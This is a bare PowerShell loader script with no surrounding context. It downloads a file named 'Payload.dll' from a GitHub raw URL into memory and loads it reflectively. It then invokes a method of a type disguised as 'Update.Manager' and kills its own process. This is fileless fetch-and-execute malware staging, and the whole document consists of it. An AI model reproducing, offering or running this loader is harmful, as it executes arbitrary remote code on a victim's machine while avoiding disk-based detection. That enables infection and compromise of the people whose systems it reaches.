[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12
$b=(New-Object Net.WebClient).DownloadData("https://raw.githubusercontent.com/7b1eahh-lang/Hero/main/Payload.dll")
[Reflection.Assembly]::Load($b).GetType("Update.Manager").GetMethod("Run").Invoke($null,@(,[string[]]@()))
[System.Diagnostics.Process]::GetCurrentProcess().Kill()
